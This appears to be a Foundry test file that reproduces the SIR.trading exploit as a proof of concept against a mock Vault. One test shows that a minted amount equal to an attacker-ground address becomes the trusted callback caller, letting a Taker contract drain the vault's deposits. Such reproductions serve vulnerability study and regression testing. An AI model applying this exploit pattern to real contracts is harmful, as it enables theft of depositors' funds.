// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {vm} from "lib/Vm.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {Vault, MockPool, Token, Taker, IUniswapV3Pool} from "../src/Vault.sol";

contract Proof {
    Token debt;
    Token coll;
    MockPool pool;
    Vault vault;
    // The address SIR.trading's attacker ground: its numeric value is the minted amount, 95759995883742311247042417521410689.
    address constant TAKER = 0x00000000001271551295307aCC16bA1e7E0d4281;

    function setUp() public {
        debt = new Token("WETH");
        coll = new Token("USDC");
        pool = new MockPool(debt, coll);
        vault = new Vault(IERC20(address(debt)), address(pool));
        debt.mint(address(vault), 1_000 ether); // other users' deposits
    }

    // Control: a direct call from anyone else is rejected.
    function testDirectCallRejected() public {
        vm.prank(address(0xCAFE));
        vm.expectRevert(bytes("caller"));
        vault.uniswapV3SwapCallback(1 ether, 0, abi.encode(address(0xCAFE)));
    }

    function testMintedAmountBecomesTheTrustedCaller() public {
        vm.etch(TAKER, type(Taker).runtimeCode);
        debt.mint(TAKER, uint256(uint160(TAKER)));
        uint256 vaultBefore = debt.balanceOf(address(vault));
        Taker(TAKER).run(vault, IUniswapV3Pool(address(pool)), IERC20(address(debt)));
        require(debt.balanceOf(address(vault)) == 0, "vault not empty");
        require(debt.balanceOf(TAKER) == vaultBefore, "taker did not receive the vault's balance");
    }
}
